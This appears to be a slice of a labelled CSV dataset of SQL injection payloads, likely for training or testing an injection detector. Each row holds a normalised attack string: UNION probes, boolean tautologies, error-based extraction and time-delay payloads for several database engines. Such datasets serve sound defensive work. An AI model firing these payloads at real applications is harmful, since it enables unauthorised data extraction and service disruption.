row_index,payload_norm,label,sqli_type_hint
1110,"1 ) union all select null,null,null,null,null,null,null,null,null,null--",1,
1111,"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",1,
1112,select ( case when ( 5390 = 7419 ) then 5390 else 5390* ( select 5390 from mysql.db ) end ) #,1,
1113,-7111' or ( 8459 = 8459 ) *4906,1,
1114,"1 union all select null,null,null,null,null,null,null#",1,
1115,-7859 ) as ipdg where 4413 = 4413 or 9323 = 9323#,1,
1116,"-2323"" ) as zgsn where 9274 = 9274 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",1,
1117,1 ) where 5774 = 5774,1,
1118,"1"" ) ) as fhlg where 1004 = 1004 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",1,
1119,"-8893%' ) ) or elt ( 1032 = 1032,3623 ) and ( ( '%' = '",1,
1120,"-8791"" ) ) ) or make_set ( 6681 = 6620,6620 ) and ( ( ( ""pvdk"" = ""pvdk",1,
1121,"-3081"" ) ) ) or 3736 = 1899",1,
1122,-4082 ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 7874 = 7874,1,
1123,select ( case when ( 6615 = 3564 ) then 1 else 6615* ( select 6615 from master..sysdatabases ) end ) --,1,
1124,-7648' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),1,
1125,select ( case when ( 9540 = 5786 ) then 9540 else 9540* ( select 9540 from information_schema.character_sets ) end ) #,1,
1126,select case when 7426 = 6635 then 1 else null end--,1,
1127,"1%' ) ) ) union all select null,null,null,null#",1,
1128,"iif ( 3204 = 8489,3204,1/0 )",1,
1129,"1%' ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( '%' = '",1,
1130,"1"" ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
1131,"1"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""wjhj"" = ""wjhj",1,
1132,"1"" where 6800 = 6800 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
1133,"-3933' ) ) ) union all select 6198,6198,6198,6198,6198#",1,
1134,"1%"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""%"" = """,1,
1135,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""egzm"" = ""egzm",1,
1136,"-3361 ) ) union all select 2827,2827,2827,2827#",1,
1137,1' and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and 'iuao' = 'iuao,1,
1138,"select count ( * ) from generate_series ( 1,5000000 ) #",1,
1139,"end and ( ( ""%"" = """,1,
